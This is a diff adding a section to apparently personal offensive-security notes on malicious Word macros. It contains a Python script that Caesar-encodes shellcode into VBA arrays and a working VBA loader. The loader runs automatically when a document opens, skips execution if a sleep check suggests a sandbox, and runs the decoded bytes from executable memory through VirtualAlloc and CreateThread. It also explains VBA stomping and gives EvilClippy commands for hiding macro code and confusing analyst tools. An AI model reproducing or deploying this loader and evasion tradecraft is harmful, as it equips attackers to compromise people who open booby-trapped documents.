@@ -286,3 +286,153 @@ Function MyMacro()
 
 End Function
 ```
+
+### Some Evasion for Word
+
+Added Caesar cipher and some evasion for heuristics.
+
+* Caesar python script:
+
+```py
+
+import argparse
+
+def caesar_encrypt(data, rotation=2):
+    return bytes((byte + rotation) % 256 for byte in data)
+
+def format_vba_array(data, max_line_length=240):
+    lines = []
+    current = "buf = Array("
+
+    for byte in data:
+        value = str(byte)
+
+        separator = "" if current.endswith("(") else ", "
+        addition = separator + value
+
+        if len(current) + len(addition) + 2 > max_line_length:
+            lines.append(current + ", _")
+            current = "    " + value
+        else:
+            current += addition
+
+    lines.append(current + ")")
+
+    if len(lines) > 25:
+        raise ValueError(
+            f"Se necesitan {len(lines) - 1} continuaciones. "
+            "VBA permite un máximo de 24."
+        )
+
+    return "\n".join(lines)
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("file")
+    parser.add_argument("-r", "--rotation", type=int, default=2)
+    args = parser.parse_args()
+
+    with open(args.file, "rb") as f:
+        data = f.read()
+
+    encrypted = caesar_encrypt(data, args.rotation)
+
+    print(format_vba_array(encrypted))
+
+if __name__ == "__main__":
+    main()
+```
+
+```vb
+Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Function MyMacro()
+    Dim buf As Variant
+    Dim addr As LongPtr
+    Dim counter As Long
+    Dim data As Long
+    Dim res As LongPtr
+    Dim t1 As Date
+    Dim t2 As Date
+    Dim time As Long
+
+    t1 = Now()
+    Sleep (2500)
+    t2 = Now()
+    time = DateDiff("s", t1, t2)
+
+    If time < 2 Then
+        Exit Function
+    End If
+
+    buf = Array(252, 72, 131, 229.....)
+    For i = 0 To UBound(buf)
+        buf(i) = buf(i) - 2
+    Next i
+
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+    Next counter
+    
+    res = CreateThread(0, 0, addr, 0, 0, 0)
+
+End Function
+```
+
+## VBA Stomping
+
+VBA stomping is a malware obfuscation technique used to hide malicious code inside Microsoft office documents.
+
+When a Word contains a macro, it actually stores that macro in two different places inside the file structure:
+
+* **VBA Source Code**: The human-readable script written by the autor.
+* **Compile P-code**: The machine-readable bytecode that MS Word actually executes when the file is opened.
+
+To perform VBA stomping, an attacker creates a malicious macro and lets Office compile it into executable p-code. They then delete or overwrite the human-readable VBA source code with harmless text or blank data while leaving the malicious p-code intact.
+
+To automate this technique we can use `Evil Clippy`.
+
+* [https://www.outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/](https://www.outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/)
+
+```
+> .\EvilClippy.exe
+Usage: eviloffice.exe [OPTIONS]+ filename
+
+Author: Stan Hegt
+Email: stan@outflank.nl
+
+Options:
+  -n, --name=VALUE           The target module name to stomp.
+                               This argument can be repeated.
+  -s, --sourcefile=VALUE     File containing substitution VBA code (fake
+                               code).
+  -g, --guihide              Hide code from VBA editor GUI.
+  -t, --targetversion=VALUE  Target MS Office version the pcode will run on.
+  -w, --webserver=VALUE      Start web server on specified port to serve
+                               malicious template.
+  -d, --delmetadata          Remove metadata stream (may include your name
+                               etc.).
+  -r, --randomnames          Set random module names, confuses some analyst
+                               tools.
+  -u, --unviewableVBA        Make VBA Project unviewable/locked.
+      --uu, --viewableVBA    Make VBA Project viewable/unlocked.
+  -v                         Increase debug message verbosity.
+  -h, --help                 Show this message and exit.
+```
+
+```
+.\EvilClippy.exe -g -r benjugat.doc
+```
